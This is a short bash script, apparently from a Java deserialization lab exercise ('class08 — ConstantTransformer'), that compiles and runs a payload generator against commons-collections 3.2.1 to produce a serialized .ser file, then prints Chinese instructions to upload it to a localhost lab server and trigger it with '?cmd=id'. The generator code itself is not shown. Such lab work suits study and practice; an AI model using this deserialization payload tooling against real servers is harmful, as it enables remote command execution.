#!/bin/bash
# class08 — ConstantTransformer
cd "$(dirname "$0")"
javac -cp "../lib/commons-collections-3.2.1.jar" GenPayload.java -d .
java -cp ".:../lib/commons-collections-3.2.1.jar" class08.GenPayload
rm -rf class08
mv *.ser .. 2>/dev/null
echo "🎯 上传 class08.ser 到 http://localhost:81/class08/"
echo "    访问时需要加 ?cmd=id 参数"
